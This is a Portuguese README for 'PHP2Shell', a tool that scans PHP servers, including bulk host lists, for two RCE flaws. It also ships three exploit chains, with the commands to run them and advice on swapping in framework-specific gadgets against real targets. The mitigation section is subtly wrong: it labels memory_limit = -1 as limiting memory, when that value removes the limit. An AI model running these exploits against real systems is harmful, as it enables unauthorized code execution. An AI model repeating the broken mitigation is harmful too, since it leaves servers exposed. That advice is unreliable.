# PHP2Shell

## **Idiomas:** [Português Brazil](README.md) | [English](README-US.md)

Ferramenta de linha de comando para detecção e exploração de **CVE-2026-109618** e **CVE-2026-109619** (PHP2Shell) em aplicações PHP.

## Sobre a CVE

PHP2Shell é o nome coletivo dado a duas vulnerabilidades críticas de **Remote Code Execution (RCE)** não autenticado no runtime do PHP . Ambas foram descobertas por pesquisadores da Calif, OpenAI e Wiz, e corrigidas em 21 de outubro de 2026 .

As falhas têm origem no tratamento de memória do PHP quando uma requisição termina de forma anormal:

- **CVE-2026-109618** (CVSS 9.8): Corrupção de memória durante o tratamento de *out-of-memory*. O PHP pode ser interrompido no meio da inicialização de uma requisição, deixando dados internos parcialmente inicializados. A limpeza subsequente trata esses dados inválidos como válidos, permitindo execução remota antes mesmo de qualquer código da aplicação rodar .
- **CVE-2026-109619** (CVSS 8.1): Estado global obsoleto (*stale global state*). Um worker PHP pode manter referências a memória de uma requisição já liberada. Uma requisição posterior, atendida pelo mesmo worker, acessa esse estado obsoleto, permitindo *use-after-free*, vazamento de memória e RCE com os privilégios do worker web .

O vetor de maior risco é **Apache com mod_php**, onde a exploração foi demonstrada antes da execução de qualquer código da aplicação. PHP-FPM, php-cgi, FrankenPHP e LiteSpeed também são afetados .

**Versões corrigidas:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12 .

## Como o Scanner Funciona

O scanner envia uma requisição de controle multipart mínima seguida de até três probes multipart artesanais. Os probes usam chaves de array PHP aninhadas em 62 níveis e crescem de 1 MiB a 20 MiB, correspondendo à lógica de detecção usada pelo scanner interno da Assetnote.

Um alvo é reportado como vulnerável quando o probe produz um erro de esgotamento de memória do PHP, um HTTP 500 vazio diferencial, uma falha de worker PHP-FPM, ou uma versão PHP anunciada que se sabe não estar corrigida. Respostas 5xx iniciais, status comuns de rejeição de requisição e respostas HTTP 500 não vazias sem a assinatura de erro fatal do PHP não são tratados como sinais de crash.

O scanner testa `/index.php` por padrão. Um caminho fornecido na URL é preservado, e `--path` ou `--path-file` podem testar caminhos personalizados. Alvos phpMyAdmin são automaticamente retestados em `/show_config_errors.php`. Redirecionamentos não são seguidos a menos que `--follow-redirects` seja definido.

### Modos SAPI

O modo padrão `--sapi auto` aplica ambas as regras de veredito mod_php e PHP-FPM. Use `--sapi mod_php` ou `--sapi fpm` para restringir a detecção a um SAPI conhecido.

### Impacto na Rede

Cada caminho testado pode receber uma requisição de controle de 42 bytes e três probes totalizando cerca de 29 MiB. A sondagem para assim que o veredito é estabelecido, e URLs de entrada duplicadas são escaneadas uma única vez.

## Requisitos

- Python 3.9+
- h11
- tqdm

## Instalação

```bash
pip install -r requirements.txt
```

## Uso do Scanner

Escanear um único host:

```bash
python3 scanner.py -u https://example.com
```

Escanear uma lista de hosts:

```bash
python3 scanner.py -l hosts.txt
```

Escanear com múltiplas threads e salvar resultados:

```bash
python3 scanner.py -l hosts.txt -t 20 -o results.json
```

Escanear com cabeçalhos personalizados:

```bash
python3 scanner.py -u https://example.com -H "Authorization: Bearer token" -H "Cookie: session=abc"
```

Escanear um caminho personalizado:

```bash
python3 scanner.py -u https://example.com --path /phpinfo.php
python3 scanner.py -u https://example.com --path /index.php --path /admin.php
python3 scanner.py -u https://example.com --path-file paths.txt
```

Usar apenas regras de veredito PHP-FPM:

```bash
python3 scanner.py -u https://example.com --sapi fpm
```

## Opções do Scanner

```
-u, --url           URL única para verificar
-l, --list          Arquivo contendo hosts (um por linha)
-t, --threads       Número de threads concorrentes (padrão: 10)
--timeout           Timeout da requisição em segundos (padrão: 60)
-o, --output        Arquivo de saída para resultados (JSON)
--all-results       Salvar todos os resultados, não apenas hosts vulneráveis
-k, --insecure      Desabilitar verificação de certificado TLS
--follow-redirects  Seguir redirecionamentos HTTP (até 10 saltos)
-H, --header        Cabeçalho personalizado (pode ser usado múltiplas vezes)
-v, --verbose       Mostrar razões do veredito e trechos de resposta
-q, --quiet         Apenas exibir hosts vulneráveis
--no-color          Desabilitar saída colorida
--sapi              Regras de veredito: auto, mod_php ou fpm (padrão: auto)
--path              Caminho personalizado para testar (pode ser usado múltiplas vezes)
--path-file         Arquivo contendo caminhos para testar (um por linha)
```

## Saída

Os resultados são impressos no terminal. Ao usar `-o`, hosts vulneráveis são salvos em um arquivo JSON com a razão do veredito e evidências de requisição/resposta HTTP redigidas. Use `--all-results` para salvar todos os resultados, não apenas os vulneráveis. Use `-q` para suprimir tudo exceto hosts vulneráveis.

## Exploits

Três exploits RCE (Chains A, B, C) estão incluídos em `exploit/`:

| Arquivo | Chain | O Que Faz | Pré-requisitos |
|---|---|---|---|
| `chain_a_session_lfi.py` | A | Injeta código PHP via filename de upload → LFI inclui arquivo de sessão → RCE | `session.upload_progress.enabled=On`, sink LFI, caminho de sessão conhecido |
| `chain_b_uaf_rce.php` | B | var_destroy UAF → descobre `zif_system` via `EG()` → sobrescreve handler de `var_dump` via `/proc/self/mem` → RCE | **Apenas PHP 8.2.34-fpm**, execução local, `/proc/self/mem` gravável (container privilegiado). PoC de lab, não genérico. |
| `chain_c_mismatch_rce.py` | C | Polui worker FPM `PS(serializer)` → injeta objeto serializado via filename → `__destruct` dispara na falha de decode → RCE | Workers FPM persistentes, endpoint chamando `ini_set('session.serialize_handler','php_serialize')`, **gadget POP específico do alvo** |

Chains D e E estão disponíveis para assinantes pagos.

### Chain A — Injeção de sessão + LFI → RCE

```bash
python3 exploit/chain_a_session_lfi.py \
  --target http://TARGET \
  --inject-path /index.php \
  --lfi-path /vuln.php \
  --session-path /tmp/sessions \
  --command 'id'
```

Requer um sink LFI no alvo. Use `--cleanup-on` para competir com o padrão `session.upload_progress.cleanup=On` usando um escritor estagnado.

### Chain B — var_destroy UAF → RCE (PoC de lab)

⚠️ **Calibrado para PHP 8.2.34-fpm apenas.** Requer execução local de PHP no alvo e `/proc/self/mem` gravável (container privilegiado). Outras versões (8.0/8.1/8.3/8.4/8.2.35+) falham com `symbols not found` porque o offset de `EG` e o offset do handler diferem. Este **não é um exploit remoto genérico**.

```bash
php exploit/chain_b_uaf_rce.php
```

### Chain C — Handler mismatch → __destruct → RCE

⚠️ O gadget padrão (`O:4:"Evil":...`) é um **placeholder** — só funciona contra labs que definem uma classe `Evil` com `__destruct` explorável. Contra alvos reais, passe `--gadget` com uma POP chain específica do framework (Laravel `PendingBroadcast`, Symfony `TagAwareAdapter`, WordPress `WP_Object_Cache`, etc.).

```bash
python3 exploit/chain_c_mismatch_rce.py \
  --target http://TARGET \
  --pollute-path /endpoint_php_serialize \
  --upload-path /app/upload.php \
  --trigger-path /api/endpoint.php \
  --gadget 'O:...'
```

## Mitigação

A única correção completa é **atualizar o PHP** para 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+ e reiniciar os workers .

Para ambientes que não podem atualizar imediatamente, o PHP publicou mitigações temporárias que reduzem a exposição, mas **não eliminam o risco** :

### Para CVE-2026-109618

```ini
; Limitar o consumo de memória (php_admin_value no pool FPM ou Apache)
memory_limit = -1
post_max_size = 8M   ; ou 32M se uploads forem necessários
```

### Para CVE-2026-109619

```ini
; Desabilitar upload progress e reiniciar todos os workers
session.upload_progress.enabled = 0

; Apenas PHP 8.5: desabilitar backtraces de erro fatal
fatal_error_backtraces = 0
```

> **Nota:** estas mitigações devem ser aplicadas no `php.ini`, configuração do pool FPM ou Apache — não via `ini_set()` ou `.user.ini`. Elas bloqueiam apenas os caminhos de ataque conhecidos e não substituem a atualização .

Para ambientes legados (PHP 5.4–8.1, EOL), backports comunitários estão disponíveis em [Anton-Barinov/php2shell-patches](https://github.com/Anton-Barinov/php2shell-patches) .

## Limitações do Scanner

Em configurações específicas de PHP, o scanner pode reportar um falso positivo quando seu probe multipart excede o `memory_limit` do PHP. Versões corrigidas e vulneráveis podem então retornar a mesma resposta HTTP 500 vazia.

Isso foi reproduzido em PHP 8.4.27 corrigido com valores de `memory_limit` de **2M a 32M**, e em PHP 8.3.36 com **128M** quando `max_multipart_body_parts` está definido como **2785 ou superior**. O limiar exato pode variar entre builds.

Quando o PHP não divulga sua versão, o scanner não consegue distinguir esse OOM seguro pós-patch do comportamento vulnerável pré-patch. Os resultados devem, portanto, ser verificados contra a versão do PHP instalada e quaisquer backports do fornecedor.

## Créditos

A descoberta original do php2shell é atribuída à equipe **Calif**, com contribuições de **OpenAI** e **Wiz**. O write-up original está disponível em [calif.io/php2shell](https://calif.io/php2shell/) .

O scanner foi construído pela **Assetnote Security Research Team** usando lógica desenvolvida para a Exposure Platform da Searchlight.

## Licença

Consulte [LICENSE](LICENSE) para detalhes.
